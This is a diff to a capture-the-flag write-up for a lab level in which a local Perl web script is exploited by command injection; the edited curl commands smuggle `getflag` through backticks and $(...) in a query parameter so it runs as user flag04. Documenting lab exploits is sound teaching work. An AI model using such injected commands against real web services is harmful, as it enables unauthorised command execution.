@@ -20,13 +20,13 @@ Examine the Perl script (`level04.pl`) to understand its functionality. Note tha
 Use `curl` to exploit the script and execute the `getflag` command:
 
 ```bash
-curl http://localhost:4747?x=`getflag`
+curl http://localhost:4747?x=\`getflag\`
 ```
 
 Or use the alternative syntax:
 
 ```bash
-curl http://localhost:4747?x=$(getflag)
+curl http://localhost:4747?x='$(getflag)'
 ```
 
 These commands will execute `getflag` as the user `flag04` and display the result.
@@ -39,4 +39,4 @@ Open a web browser and enter either of the following URLs:
 
 You should see the flag displayed.
 
-Congratulations! You've successfully exploited the web server to execute the `getflag` command with `flag04` permissions.0
+Congratulations! You've successfully exploited the web server to execute the `getflag` command with `flag04` permissions.
